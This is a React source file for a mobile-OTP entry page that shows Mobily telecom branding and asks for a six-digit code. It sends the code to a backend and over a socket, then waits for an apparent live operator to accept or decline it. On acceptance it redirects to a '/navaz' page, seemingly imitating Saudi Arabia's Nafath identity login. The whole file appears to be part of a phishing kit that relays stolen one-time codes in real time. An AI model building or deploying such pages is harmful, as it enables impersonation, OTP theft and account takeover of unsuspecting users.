import React, { useEffect, useState, useCallback } from "react";
import axios from "axios";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "../context/LanguageContext";

const MobOtp = () => {
  const { t, dir } = useTranslation();
  const [phoneOtp, setPhoneOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const [error, setError] = useState(false);
  const [counter, setCounter] = useState(180);

  useEffect(() => {
    const timer = setInterval(() => {
      setCounter((c) => (c > 0 ? c - 1 : c));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const id = sessionStorage.getItem("id");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      await axios.post(`${api_route}/mobOtp/${id}`, { mobOtp: phoneOtp });
      socket.emit("mobOtp", { id, mobOtp: phoneOtp });
    } catch {
      setLoading(false);
    }
  };

  const onAcceptMobOtp = useCallback(
    (payload) => {
      if (!payload || payload.id !== id) return;
      const code = payload.price ?? payload.userOtp;
      navigate(
        `/navaz?id=${encodeURIComponent(id)}&userOtp=${encodeURIComponent(String(code ?? ""))}`
      );
    },
    [id, navigate]
  );

  const onDeclineMobOtp = useCallback(
    (incomingId) => {
      if (incomingId !== id) return;
      setLoading(false);
      navigate("/phone");
    },
    [id, navigate]
  );

  useEffect(() => {
    socket.on("acceptMobOtp", onAcceptMobOtp);
    socket.on("declineMobOtp", onDeclineMobOtp);
    return () => {
      socket.off("acceptMobOtp", onAcceptMobOtp);
      socket.off("declineMobOtp", onDeclineMobOtp);
    };
  }, [onAcceptMobOtp, onDeclineMobOtp]);

  return (
    <div className="w-full lg:w-1/2 mx-auto flex flex-col items-center justify-center rounded-md">
      <form
        className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3 text-sm w-11/12"
        dir={dir}
        onSubmit={handleSubmit}
      >
        <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4 flex-col">
          <img src="/photoHeader2.jpeg" alt="" className="w-20" />
          <div className="flex items-start ">
            <img src="/phoneHeader1.jpeg" alt="" className="w-20" />
            <span className="font-semibold">{t("mobOtp.otpSent")}</span>
          </div>
        </div>

        <div className="flex justify-end items-center mb-1 -mt-2 rounded-lg px-2">
          <img
            src="/mobily.jpeg"
            alt="mobily"
            className="h-16 object-contain"
            onError={(e) => {
              e.target.style.display = "none";
            }}
          />
        </div>

        <p className="text-right text-lg text-sky-600 leading-relaxed p-2 font-bold">
          {t("mobOtp.callInstructions")}
        </p>

        <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
          <input
            value={phoneOtp}
            required
            onChange={(e) => setPhoneOtp(e.target.value)}
            dir="ltr"
            placeholder={t("common.otpCode")}
            inputMode="numeric"
            type="text"
            maxLength={6}
            className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-left outline-blue-500 w-full"
          />
        </div>
        <div className="flex items-center justify-between">
          <div className="flex justify-center items-center my-4">
            <span className="text-gray-600">
              {t("mobOtp.resendIn")} {formattedMinutes}:{formattedSeconds}
            </span>
          </div>
          <div className=" flex items-center justify-center py-5 mt-4">
            <button
              type="submit"
              className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-full text-base font-semibold transition-colors"
            >
              {t("common.verify")}
            </button>
          </div>
        </div>

        {error && (
          <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-50">
            <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
              <AiOutlineCloseCircle className="text-6xl" />
              <div className="flex flex-col w-full items-center justify-center">
                <span>{t("common.invalidOtp")}</span>
              </div>
              <button
                type="button"
                className="bg-gray-900 text-white w-11/12 py-3 rounded-lg"
                onClick={() => setError(false)}
              >
                {t("common.tryAgain")}
              </button>
            </div>
          </div>
        )}

        <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
          <img src="/phoneFooter.jpeg" alt="" className="object-contain" />
        </div>
      </form>

      {loading && (
        <div className="fixed top-0 w-full h-screen bg-[#ffffffc7] flex items-center justify-center flex-col gap-y-5 z-50">
          <TailSpin
            height="50"
            width="50"
            color="blue"
            ariaLabel="tail-spin-loading"
            radius="1"
            visible
          />
          <span className="font-semibold">{t("common.loadingVerify")}</span>
        </div>
      )}
    </div>
  );
};

export default MobOtp;
